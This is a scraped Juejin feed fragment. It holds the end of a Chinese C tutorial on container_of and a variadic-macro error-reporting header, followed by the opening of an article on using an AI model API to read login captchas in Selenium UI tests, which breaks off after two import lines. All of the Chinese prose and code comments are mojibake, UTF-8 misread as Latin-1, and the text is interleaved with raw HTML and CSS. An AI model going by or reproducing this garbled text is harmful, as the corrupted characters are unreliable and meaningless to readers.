<p><code>container_of</code>æ˜¯<code>offsetof</code>çš„åå‘åº”ç”¨ï¼š<strong>å·²çŸ¥æˆå‘˜çš„åœ°å€ + æˆå‘˜çš„åç§»é‡ï¼Œåæ¨ç»“æ„ä½“çš„é¦–åœ°å€</strong>ï¼ˆè¿™ä¸ªåœ°æ–¹å°±æ˜¯ä¸Šé¢çš„ä¾‹å­æˆ‘çŸ¥é“æˆ‘ä»¬ä¹‹é—´çš„è·ç¦»ä¹‹åç›´æ¥ç”¨æˆ‘çš„ä½ç½®å‡å»è·ç¦»å³å¯ï¼‰ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> container_of(ptr, type, member) ({          \
   const typeof(((type *)0)-&gt;member) * __mptr = (ptr); \
   (type *)((char *)__mptr - offsetof(type, member)); \
})</span>
<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">node</span> =</span> ...;
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Task</span> *<span class="hljs-title">task</span> =</span> container_of(node, <span class="hljs-keyword">struct</span> Task, list_node);
</code></pre>
<p>###å®å®šä¹‰å®æˆ˜
ç¼–å†™ä¸€ä¸ªè‡ªå®šä¹‰çš„æŠ¥é”™å¤´æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åˆ«çš„æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œå½“æˆ‘å¼•ç”¨è¿™ä¸ªå¤´æ–‡ä»¶çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡é”™è¯¯ç¼–å·ä½¿ç”¨ä¾‹å¦‚<code>ERROR(ERR_EMPTY);</code>ï¼Œæ˜¾ç¤ºé”™è¯¯åŸå› ï¼Œé”™è¯¯æ‰€åœ¨æ–‡ä»¶ï¼Œè¡Œï¼Œåˆ—å’Œç”¨æˆ·é™„å¸¦ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºæ¯”å¦‚ä¸‹é¢è¿™ä¸ªæ ·å­ï¼Œå¹¶ä¸”<strong>å¯ä»¥ç‚¹å‡»å¸®åŠ©ç”¨æˆ·å¿«é€Ÿè·³è½¬åˆ°é”™è¯¯å¹¶çŸ¥æ™“é”™è¯¯åŸå› </strong></p>
<pre><code class="hljs language-c" lang="c">main.c:<span class="hljs-number">13</span>: [ERROR] main | reason: The current container is empty 
test: Error.h:<span class="hljs-number">49</span>: my_error_handler: Assertion `<span class="hljs-number">0'</span> failed.
Aborted (core dumped)
</code></pre>
<h5 data-id="heading-26">å®ç°ä»£ç  çŸ¥è¯†ç‚¹åœ¨ä¸‹é¢</h5>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ERROR_H</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR_H</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;errno.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span>

<span class="hljs-comment">// é”™è¯¯ç æšä¸¾</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ERRCode</span> <span class="hljs-title">ERRCode</span>;</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ERRCode</span>{</span>
    ERR_PTR_NULL,   <span class="hljs-comment">// ç©ºæŒ‡é’ˆ</span>
    ERR_OPT_FAIL,   <span class="hljs-comment">// æ“ä½œå¤±è´¥</span>
    ERR_MEM_FAIL,   <span class="hljs-comment">// å†…å­˜ç”³è¯·å¤±è´¥</span>
    ERR_EMPTY       <span class="hljs-comment">// å®¹å™¨ä¸ºç©º</span>
};

<span class="hljs-comment">// é”™è¯¯ç å¯¹åº”æè¿°</span>
<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span>* ErrStr[]={
    <span class="hljs-string">"current point is NULL"</span>,
    <span class="hljs-string">"current opt is failed"</span>,
    <span class="hljs-string">"memory allocation is failed"</span>, 
    <span class="hljs-string">"The current container is empty"</span>
};

<span class="hljs-comment">// é”™è¯¯å¤„ç†æ ¸å¿ƒå‡½æ•°</span>
<span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">my_error_handler</span><span class="hljs-params">(
   ERRCode code,<span class="hljs-comment">//é”™è¯¯ä»£ç </span>
   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file,<span class="hljs-comment">//æ–‡ä»¶å</span>
   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *func,<span class="hljs-comment">//å‡½æ•°å</span>
   <span class="hljs-type">const</span> <span class="hljs-type">int</span> line,<span class="hljs-comment">//æ‰€åœ¨è¡Œ</span>
   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg<span class="hljs-comment">//ç”¨æˆ·æºå¸¦ä¿¡æ¯</span>
)</span>{
   
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%s:%d: [ERROR] %s | reason: %s "</span>, file, line, func, ErrStr[code]);
    
    <span class="hljs-comment">// è‡ªå®šä¹‰æ¶ˆæ¯</span>
    <span class="hljs-keyword">if</span>(msg){
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"| msg: %s "</span>, msg);
    }
    <span class="hljs-comment">// ç³»ç»Ÿé”™è¯¯ï¼ˆerrnoï¼‰</span>
    <span class="hljs-keyword">if</span>(errno){
     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"| system prompt: %s "</span>, strerror(errno));
    }
   <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"\n"</span>);
   <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> NDEBUG</span>
   <span class="hljs-built_in">exit</span>(EXIT_FAILURE);
   <span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
   assert(<span class="hljs-number">0</span>);
   <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}
<span class="hljs-comment">//æ¥ä¸‹æ¥ä¸¤ç§é”™è¯¯æ¨¡å‹</span>
<span class="hljs-comment">// ä¼ å…¥å‚æ•°é”™è¯¯ä»£ç ï¼šå…¼å®¹å•/åŒå‚æ•°ï¼Œæ­¤æ—¶ä¼ å…¥ç”¨æˆ·æºå¸¦ä¿¡æ¯ä¸ºç©º</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> _ERROR_MODE1(code) do{\
    my_error_handler((code),__FILE__,__func__,__LINE__,NULL);\
}while(0)</span>
<span class="hljs-comment">//ä¼ å…¥å‚æ•°é”™è¯¯ä»£ç å’Œç”¨æˆ·æºå¸¦ä¿¡æ¯</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> _ERROR_MODE2(code,msg) do{\
    my_error_handler((code),__FILE__,__func__,__LINE__,msg);\
}while(0)</span>
<span class="hljs-comment">//_1,_2å ä½ç¬¦å°±æ˜¯ä½ ä¸ä½¿ç”¨å‰ä¸¤ä¸ªå˜é‡ï¼Œç¬¬ä¸‰ä¸ªå˜é‡å°±æ˜¯æˆ‘çš„æ¨¡å‹</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> _GET_MODE(_1,_2,NAME) NAME </span>
<span class="hljs-comment">//...å¯å˜å‚æ•°å¯èƒ½ä¸€ä¸ªå¯èƒ½ä¸¤ä¸ªï¼Œç„¶åå¦‚æœæ˜¯ä¸¤ä¸ªå‚æ•°é‚£ä¹ˆæˆ‘çš„_ERROR_MODE2å°±æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°æˆ‘çš„æ¨¡å‹</span>
<span class="hljs-comment">//å¦‚æœæ˜¯ä¸€ä¸ªå‚æ•°åœ¨åŠ ä¸Šä¸€ä¸ª_ERROR_MODE2ï¼Œæˆ‘çš„_ERROR_MODE1å°±å¯ä»¥å˜æˆæˆ‘çš„æ¨¡å‹</span>
<span class="hljs-comment">//__GETç¡®å®šæ¨¡å‹ç„¶åä¼ å…¥å‚æ•°å‚æ•°ä½¿ç”¨__VA_ARGS__å±•å¼€å‚æ•°</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR(...) do{\ </span>
    _GET_MODE(__VA_ARGS__,_ERROR_MODE2,_ERROR_MODE1) (__VA_ARGS__);\
}<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
</code></pre>
<p>ä½¿ç”¨çš„çŸ¥è¯†ç‚¹</p>
<h4 data-id="heading-27">1.æšä¸¾ç±»</h4>
<p>å°†æˆ‘ä»¬çš„ä¸€äº›å­—ç¬¦æ›¿æ¢æˆæ•°å­—ï¼Œå…·ä½“æ¥è¯´æ¯”å¦‚ERR_PTR_NULLé»˜è®¤ä¸º0ï¼Œå¾€ä¸‹ç»§ç»­æšä¸¾æ¯æ¬¡åŠ 1ï¼ŒERR_OPT_FAILæ˜¯ç­‰äº1çš„ï¼Œç›´æ¥è¿è¡Œä¸‹é¢ä»£ç çœ‹æ•ˆæœ</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-class"><span class="hljs-keyword">enum</span>Â <span class="hljs-title">ERRCode</span>{</span>  
Â Â Â Â ERR_PTR_NULL,Â Â Â <span class="hljs-comment">//Â ç©ºæŒ‡é’ˆ  </span>
Â Â Â Â ERR_OPT_FAIL,Â Â Â <span class="hljs-comment">//Â æ“ä½œå¤±è´¥  </span>
Â Â Â Â ERR_MEM_FAIL,Â Â Â <span class="hljs-comment">//Â å†…å­˜ç”³è¯·å¤±è´¥  </span>
Â Â Â Â ERR_EMPTYÂ Â Â Â Â Â Â <span class="hljs-comment">//Â å®¹å™¨ä¸ºç©º  </span>
};  
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
Â Â Â Â <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_PTR_NULL=Â %d\n"</span>,ERR_PTR_NULL);  
Â Â Â Â <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_OPT_FAIL=Â %d\n"</span>,ERR_OPT_FAIL);  
Â Â Â Â <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_MEM_FAIL=Â %d\n"</span>,ERR_MEM_FAIL);  
Â Â Â Â <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_EMPTY=Â %d\n"</span>,ERR_EMPTYÂ );  
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;  
}
</code></pre>
<p>ä½ å¦‚æœæƒ³ä»3å¼€å§‹æšä¸¾ç›´æ¥å†™æˆ</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">enum</span>Â <span class="hljs-title">ERRCode</span>{</span>  
Â Â Â Â ERR_PTR_NULL=<span class="hljs-number">3</span>,Â Â Â <span class="hljs-comment">//Â ç©ºæŒ‡é’ˆ  </span>
Â Â Â Â ERR_OPT_FAIL,Â Â Â <span class="hljs-comment">//Â æ“ä½œå¤±è´¥  </span>
Â Â Â Â ERR_MEM_FAIL,Â Â Â <span class="hljs-comment">//Â å†…å­˜ç”³è¯·å¤±è´¥  </span>
Â Â Â Â ERR_EMPTYÂ Â Â Â Â Â Â <span class="hljs-comment">//Â å®¹å™¨ä¸ºç©º  </span>
};  
</code></pre>
<p>ERR_PTR_NULLæœ¬è´¨æ˜¯æ•°å­—é‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠå®ƒä½œä¸ºä¸‹æ ‡ï¼Œç»“åˆé”™è¯¯å­—ç¬¦ä¸²æ•°ç»„<code>char* ErrStr[]</code>æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ErrStr[ERR_PTR_NULL],è®¿é—®è¿™ä¸ªå¯¹åº”çš„é”™è¯¯çš„æ–‡æœ¬æç¤º</p>
<h4 data-id="heading-28">inlineå‡½æ•°</h4>
<p>ä¹Ÿæ˜¯å‡½æ•°åªä¸è¿‡æ‰§è¡Œçš„æ—¶å€™æ˜¯æ–‡æœ¬åµŒå¥—çš„æ ¼å¼æ‰§è¡Œå¤§æ¦‚ï¼Œè‡ªè¡Œäº†è§£å†™ä¸åŠ¨äº†</p>
<h4 data-id="heading-29">è‡ªå¸¦çš„å®å®šä¹‰</h4>
<p>| <code>__FILE__</code> | å½“å‰æºæ–‡ä»¶å | é”™è¯¯å®šä½ |
| <code>__LINE__</code> | å½“å‰è¡Œå· | å´©æºƒè¿½è¸ª |
| <code>__func__</code> | å½“å‰å‡½æ•°å | æ—¥å¿—æ‰“å° |
...å¯å˜å‚æ•°ï¼Œ__VA_ARGS__å±•å¼€è¿™ä¸ªå‚æ•°ï¼Œéƒ½åœ¨ä¸Šé¢éƒ¨åˆ†æœ‰ä»‹ç»</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è°ƒç”¨aiæ¥å£-éªŒè¯ç çš„è·å–ä¸è¯†åˆ«]]></title>    <link>https://juejin.cn/post/7603054272158761010</link>    <guid>https://juejin.cn/post/7603054272158761010</guid>    <pubDate>2026-02-05T09:40:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158761010" data-draft-id="7602464510607999002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è°ƒç”¨aiæ¥å£-éªŒè¯ç çš„è·å–ä¸è¯†åˆ«"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T09:40:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å³°ä¸­æœ‰å¤šäº‘"/> <meta itemprop="url" content="https://juejin.cn/user/1913602002914967"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è°ƒç”¨aiæ¥å£-éªŒè¯ç çš„è·å–ä¸è¯†åˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1913602002914967/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å³°ä¸­æœ‰å¤šäº‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:40:49.000Z" title="Thu Feb 05 2026 09:40:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;color:rgba(46,36,36,.87);overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{margin-bottom:5px;font-size:30px;font-weight:500}.markdown-body h1:before{content:"#";margin-right:10px;color:#1976d2}.markdown-body h2{font-size:28px;font-weight:400;border-left:5px solid #454545;margin-top:20px;padding-left:10px;transition:all .3s ease-in-out}.markdown-body h2:hover{border-color:#1976d2}.markdown-body h3{font-size:24px;font-weight:400;margin-top:15px;padding-bottom:0}.markdown-body h4{font-size:20px;font-weight:500}.markdown-body h5{font-size:16px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h2:first-letter,.markdown-body h3:first-letter,.markdown-body p:first-letter{text-transform:capitalize}.markdown-body em{text-emphasis:dot;text-emphasis-position:under}.markdown-body img{display:block;margin:0 auto!important;max-width:100%;border-radius:2px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#ddd,#999,#ddd);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body code{font-weight:900;word-break:break-word;border-radius:2px;overflow-x:auto;font-size:.87em;padding:.065em .4em;background-color:#fbe5e1;color:#c0341d}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:0 4px}.markdown-body pre&gt;code{font-weight:400;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{margin:0 4px;text-decoration:none;color:#027fff;transition:all .3s ease-in-out;padding-bottom:4px;border-bottom:2px solid transparent}.markdown-body a:after{content:"";display:inline-block;width:18px;height:18px;margin-left:4px;vertical-align:middle;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9IiMwMjdGRkYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PHBhdGggZD0iTTkuODE1IDYuNDQ4bDEuOTM2LTEuOTM2YzEuMzM3LTEuMzM2IDMuNTgtMS4yNTkgNS4wMTMuMTczIDEuNDMyIDEuNDMyIDEuNTEgMy42NzYuMTczIDUuMDEzbC0xLjQ1MiAxLjQ1Mi0uOTY4Ljk2OGMtMS4zMzcgMS4zMzYtMy41ODEgMS4yNTktNS4wMTMtLjE3MyIvPjxwYXRoIGQ9Ik0xMS4yNjcgMTUuMzY3bC0xLjkzNiAxLjkzNmMtMS4zMzYgMS4zMzctMy41OCAxLjI2LTUuMDEyLS4xNzMtMS40MzItMS40MzItMS41MS0zLjY3Ni0uMTczLTUuMDEybDEuNDUyLTEuNDUyLjk2OC0uOTY4YzEuMzM2LTEuMzM3IDMuNTgtMS4yNiA1LjAxMi4xNzMiLz48L2c+PC9zdmc+);background-size:cover;background-repeat:no-repeat}.markdown-body a:hover{border-color:#027fff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body a.footnote-backref:after,.markdown-body a.footnote-ref:after,.markdown-body sup a:after{display:none!important}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border:2px solid #c6c6c6}.markdown-body table img{box-shadow:none!important}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body del{color:rgba(0,0,0,.6)}.markdown-body blockquote{position:relative;color:#666;padding:5px 23px 1px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:hsla(0,0%,78.4%,.12);transition:all .2s ease-in-out}.markdown-body blockquote:hover{border-color:#1976d2}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;font-size:24px;font-weight:800;line-height:24px;color:#cbcbcb;opacity:.6}.markdown-body blockquote:before{content:"â€œ";top:4px;left:6px}.markdown-body blockquote:after{content:"â€";right:8px;bottom:-8px}.markdown-body blockquote&gt;p,.markdown-body blockquote blockquote{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body details{outline:none;border:none;border-left:4px solid #1976d2;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary:hover::-webkit-details-marker{color:#1976d2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨åšUIè‡ªåŠ¨åŒ–æµ‹è¯•çš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°ç™»å½•æ—¶ï¼Œéœ€è¦è¾“å…¥éªŒè¯ç çš„åœºæ™¯<br/>
æœ€ç®€å•çš„æ–¹å¼å½“ç„¶æ˜¯å’Œå¼€å‘æ²Ÿé€šï¼Œå–æ¶ˆéªŒè¯ç çš„æ ¡éªŒï¼Œ<br/>
ä½†æ˜¯æ±‚äººä¸å¦‚æ±‚è‡ªå·±ï¼Œå“ˆå“ˆå“ˆï¼Œå°±æœ‰äº†è¿™ç¯‡æ–‡ç« </p>
<h2 data-id="heading-1">æ€è·¯æ•´ç†</h2>
<p>æ—¢ç„¶è¦è¿›è¡ŒéªŒè¯ç çš„è¯»å–ï¼Œç®€å•å‘æ•£ä¸€ä¸‹æ€è·¯ï¼Œ</p>
<ol>
<li>è·å–éªŒè¯ç çš„å›¾ç‰‡æ•°æ®</li>
<li>ä½¿ç”¨ocrç¬¬ä¸‰æ–¹åº“å¤„ç†å›¾ç‰‡</li>
<li>ocrè¯†åˆ«å›¾ç‰‡</li>
<li>å°†è¯†åˆ«åçš„æ•°æ®è¿›è¡Œä¿å­˜
ç®€å•å°±åˆ†ä¸ºä»¥ä¸Šå››æ­¥</li>
</ol>
<p>ä½†æ˜¯å¼€å§‹è¿›è¡Œä»£ç çš„ç¼–å†™åï¼Œå‘ç°ä½¿ç”¨ocrç¬¬ä¸‰æ–¹åº“é‡åˆ°ä¸¤ä¸ªé—®é¢˜</p>
<ol>
<li>è¯†åˆ«ç²¾åº¦ä¸é«˜</li>
<li>pythonç‰ˆæœ¬ä¸å…¼å®¹ï¼Œé…ç½®å¾ˆéº»çƒ¦</li>
</ol>
<p>äºæ˜¯å¼€å§‹è½¬å˜æ€è·¯ï¼Œæœ€è¿‘aiæ¯”è¾ƒç«ï¼Œæƒ³å°è¯•é€šè¿‡è®¿é—®aiæ¥å£ï¼Œä¸Šä¼ å›¾ç‰‡æ•°æ®ï¼Œè®©aiè¿›è¡Œè¯†åˆ«è¿”å›æ•°æ®</p>
<ol>
<li>è·å–éªŒè¯ç çš„å›¾ç‰‡æ•°æ®</li>
<li>åˆ›å»ºè¿æ¥è®¿é—®aiç«¯å£</li>
<li>æ„å»ºå¯¹è¯å†…å®¹</li>
<li>è¾“å‡ºéªŒè¯ç å†…å®¹</li>
</ol>
<h2 data-id="heading-2">ä»£ç å®ç°</h2>
<p>ä»£ç ä½¿ç”¨çš„æ˜¯ã€æ–¹èˆŸå¤§æ¨¡å‹ã€‘
é¦–å…ˆéœ€è¦å®‰è£…æ–¹èˆŸ SDK
pip install volcenginesdkarkruntime</p>
<p>å…³äºseleniuméƒ¨åˆ†å°±ä¸åœ¨è¿™é‡Œç¼–å†™äº†</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver
